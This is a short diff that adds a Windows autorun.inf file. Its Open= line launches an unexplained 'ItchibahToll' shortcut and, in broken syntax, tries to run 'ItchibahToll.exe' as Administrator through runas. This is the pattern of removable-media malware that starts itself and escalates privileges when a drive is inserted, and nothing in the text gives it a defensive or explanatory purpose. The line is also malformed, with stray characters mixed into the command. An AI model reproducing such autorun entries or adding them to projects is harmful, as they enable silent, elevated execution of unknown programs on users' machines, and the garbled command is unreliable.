@@ -1,0 +1,3 @@
+
+[AutoRun]
+Open=ItchibahToll.lnk}; l="runas" /user:Administrator "ItchibahToll.exe"
